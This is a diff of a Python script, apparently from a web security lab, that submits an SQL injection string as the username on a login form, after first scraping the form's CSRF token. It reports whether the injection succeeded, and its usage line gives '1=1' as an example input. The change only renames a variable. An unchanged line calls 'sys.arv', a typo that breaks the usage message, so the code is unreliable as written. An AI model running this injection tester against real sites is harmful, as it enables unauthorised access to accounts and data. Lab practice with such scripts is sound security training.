@@ -21,10 +21,10 @@ def get_csrf_token(url, session):
     csrf = soup.find("input")['value']
     return csrf
 
-def is_exploitable(url, payload, session):
+def is_exploitable(url, user, session):
     csrf = get_csrf_token(url, session)
     data = {"csrf": csrf,
-            "username": payload,
+            "username": user,
             "password": "randomtext"}
     response = session.post(
         url, 
@@ -36,14 +36,14 @@ def is_exploitable(url, payload, session):
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
-        payload = sys.argv[2].strip()
+        user = sys.argv[2].strip()
         session = requests.Session()
-        if is_exploitable(url, payload, session):
+        if is_exploitable(url, user, session):
             print("[+] SQL injection successful!")
         else:
             print("[-] SQL injection unsuccessful")
     except IndexError:
-        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print("[-] Usage: %s <url> <user>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.arv[0])
         sys.exit(-1)
 
